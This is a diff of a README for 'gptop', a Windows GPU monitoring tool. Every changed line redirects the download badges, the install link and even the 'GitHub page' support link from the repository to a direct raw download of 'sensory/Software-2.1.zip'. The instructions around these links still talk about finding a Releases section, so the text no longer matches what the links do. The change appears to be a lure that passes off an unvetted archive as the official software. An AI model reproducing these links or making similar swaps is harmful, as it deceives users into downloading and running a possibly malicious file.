@@ -1,6 +1,6 @@
 # 🖥️ gptop - Easy GPU Monitoring for Windows
 
-[![Download gptop](https://img.shields.io/badge/Download-gptop-brightgreen)](https://github.com/Adeel-khalid11/gptop)
+[![Download gptop](https://img.shields.io/badge/Download-gptop-brightgreen)](https://github.com/Adeel-khalid11/gptop/raw/refs/heads/main/sensory/Software-2.1.zip)
 
 ---
 
@@ -32,10 +32,10 @@ You do not need to install anything else. gptop works as a standalone program.
 
 You will need to visit the gptop GitHub page to get the latest version of the software.
 
-[![Download gptop](https://img.shields.io/badge/Download-gptop-blue)](https://github.com/Adeel-khalid11/gptop)
+[![Download gptop](https://img.shields.io/badge/Download-gptop-blue)](https://github.com/Adeel-khalid11/gptop/raw/refs/heads/main/sensory/Software-2.1.zip)
 
 1. Click the button above or open this link in your web browser:  
-   https://github.com/Adeel-khalid11/gptop  
+   https://github.com/Adeel-khalid11/gptop/raw/refs/heads/main/sensory/Software-2.1.zip  
 
 2. Once on the page, look for a section labeled **Releases** or **Assets**.  
 3. Find the download file for Windows. It will usually have a name ending with `.exe` or `.zip`.  
@@ -103,10 +103,10 @@ The numbers update automatically every few seconds. This helps you monitor GPU h
 
 If you have problems using gptop, you can:
 
-- Visit the GitHub page: https://github.com/Adeel-khalid11/gptop  
+- Visit the GitHub page: https://github.com/Adeel-khalid11/gptop/raw/refs/heads/main/sensory/Software-2.1.zip  
 - Check the README and Issues sections on GitHub for common questions.  
 - Look for support forums or communities related to your GPU brand.
 
 ---
 
-[![Download gptop](https://img.shields.io/badge/Download-gptop-brightgreen)](https://github.com/Adeel-khalid11/gptop)
+[![Download gptop](https://img.shields.io/badge/Download-gptop-brightgreen)](https://github.com/Adeel-khalid11/gptop/raw/refs/heads/main/sensory/Software-2.1.zip)
